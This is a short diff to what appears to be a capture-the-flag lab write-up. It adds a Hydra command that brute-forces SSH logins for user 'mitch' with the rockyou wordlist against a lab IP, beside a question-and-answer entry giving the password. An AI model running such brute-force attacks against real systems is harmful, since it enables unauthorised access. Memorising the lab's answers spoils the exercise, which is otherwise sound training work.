@@ -65,6 +65,8 @@ ANONYMOUS login worked here
 
 <img width="1214" height="402" alt="Screenshot 2025-08-01 163002" src="https://github.com/user-attachments/assets/0ff3fcb5-a9a8-48ed-ba37-272014ecb896" />
 
+```hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.123```
+
 **Q5:What's the password?**
 
 **➡️secret**
